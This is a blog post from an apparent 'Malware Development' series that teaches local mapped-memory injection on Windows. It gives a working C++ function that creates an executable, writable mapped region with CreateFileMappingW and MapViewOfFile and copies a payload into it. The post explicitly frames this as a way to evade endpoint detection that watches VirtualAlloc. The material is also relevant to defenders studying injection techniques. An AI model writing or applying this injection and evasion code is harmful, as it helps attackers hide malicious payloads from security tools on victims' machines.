# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="private-vs-mapped-memory">Private vs Mapped memory<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#private-vs-mapped-memory" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Usually and for the wide use of API calls such as <code class="language-plaintext highlighter-rouge">VirtualAlloc()</code> and <code class="language-plaintext highlighter-rouge">VirtualAllocEx()</code> and as the memory allocation type of these API calls is Private memory, the detection is becoming very high and thus it is mandatory to find an evasion technique.</p>

<p>Another type of Injection can be Mapping Injection, or in other words injecting malicious code in <code class="language-plaintext highlighter-rouge">Mapped</code> memory sections, and this way we can avoid using the API calls we mentioned above and use API calls such as <code class="language-plaintext highlighter-rouge">CreateFileMapping</code> and <code class="language-plaintext highlighter-rouge">MapViewOfFile</code>.</p>

<h1 id="payload-injection-in-mapped-regions">Payload Injection in Mapped regions<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#payload-injection-in-mapped-regions" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<h2 id="createfilemapping">CreateFileMapping<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#createfilemapping" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>This API call return a handle to a file object, and the contents of the file on disk are mapped to a memory region.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="nf">CreateFileMappingW</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HANDLE</span>                <span class="n">hFile</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpFileMappingAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>                 <span class="n">flProtect</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>                 <span class="n">dwMaximumSizeHigh</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">DWORD</span>                 <span class="n">dwMaximumSizeLow</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPCWSTR</span>               <span class="n">lpName</span>
<span class="p">);</span>
</code></pre></div></div>

<h3 id="important-parameters">Important Parameters<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#important-parameters" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">[in] hFile</code></p>

<p>A handle to the file from which to create a file mapping object.</p>

<p><code class="language-plaintext highlighter-rouge">[in] flProtect</code></p>

<p>Specifies the page protection of the file mapping object. All mapped views of the object must be compatible with this protection.</p>

<p>We usually use <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> here.</p>

<p><code class="language-plaintext highlighter-rouge">[in] dwMaximumSizeLow</code></p>

<p>The low-order  <strong>DWORD</strong>  of the maximum size of the file mapping object.</p>

<h2 id="mapviewoffile">MapViewofFile<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#mapviewoffile" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h2>

<p>This API call maps a view of a file mapping into the address space of a calling process.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">MapViewOfFile</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HANDLE</span> <span class="n">hFileMappingObject</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>  <span class="n">dwDesiredAccess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>  <span class="n">dwFileOffsetHigh</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">DWORD</span>  <span class="n">dwFileOffsetLow</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">SIZE_T</span> <span class="n">dwNumberOfBytesToMap</span>
<span class="p">);</span>
</code></pre></div></div>

<h3 id="important-parameters-1">Important parameters<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#important-parameters-1" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">[in] hFileMappingObject</code></p>

<p>A handle to a file mapping object. The  <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createfilemappinga">CreateFileMapping</a>  and  <a href="https://learn.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-openfilemappinga">OpenFileMapping</a>  functions return this handle</p>

<p><code class="language-plaintext highlighter-rouge">[in] dwDesiredAccess</code></p>

<p>The type of access to a file mapping object, which determines the page protection of the pages.</p>

<p>We usually use <strong>FILE_MAP_EXECUTE</strong> and <strong>FILE_MAP_WRITE</strong> because we obviously need a writeable and executable memory region.</p>

<p><code class="language-plaintext highlighter-rouge">[in] dwNumberOfBytesToMap</code></p>

<p>The number of bytes of a file mapping to map to the view</p>

<h1 id="performing-injection-to-a-mapped-memory">Performing Injection to a Mapped memory<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#performing-injection-to-a-mapped-memory" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Here is the function that we will be using to perform the injection</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">LocalMapping</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pPayload</span><span class="p">,</span> <span class="n">IN</span> <span class="kt">size_t</span> <span class="n">pPayloadSize</span><span class="p">,</span> <span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">pAddress</span><span class="p">)</span> <span class="p">{</span>

    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">pMapAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>


    <span class="n">hFile</span> <span class="o">=</span> <span class="n">CreateFileMappingW</span><span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pPayloadSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"CreateFileMapping failed with error %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pMapAddress</span> <span class="o">=</span> <span class="n">MapViewOfFile</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">FILE_MAP_WRITE</span> <span class="o">|</span> <span class="n">FILE_MAP_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">pPayloadSize</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pMapAddress</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"MapViewofFile failed with error %d"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pMapAddress</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">pMapAddress</span><span class="p">,</span> <span class="n">pPayload</span><span class="p">,</span> <span class="n">pPayloadSize</span><span class="p">);</span>
    <span class="n">pAddress</span> <span class="o">=</span> <span class="n">pMapAddress</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The code above implements what is called <code class="language-plaintext highlighter-rouge">local mapped memory injection</code> by creating an executable and writable memory region and then mapping it into the processâ€™s address space</p>

<p>Then copying the payload into this mapped memory. here <code class="language-plaintext highlighter-rouge">CreateFileMappingW</code> is used to create a memory-mapped file object and <code class="language-plaintext highlighter-rouge">MapViewOfFile</code> to map this object into memory with <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code> permissions. The payload is then copied into the allocated memory using <code class="language-plaintext highlighter-rouge">memcpy</code>.</p>

<h1 id="executing" class="active">Executing<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-010/#executing" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Lets execute and examine the memory regions after copying the payload.</p>

<p>We set a breakpoint after the <code class="language-plaintext highlighter-rouge">memcpy</code>.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/10-0.jpg" alt="P0"></p>

<p>And we can check the memory region type also by using Process Hacker.</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/10-1.jpg" alt="P1"></p>

<p>As we can see, the memory is Mapped not Private, which helps us in improving our evasion technique and appearing more legitimate.</p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>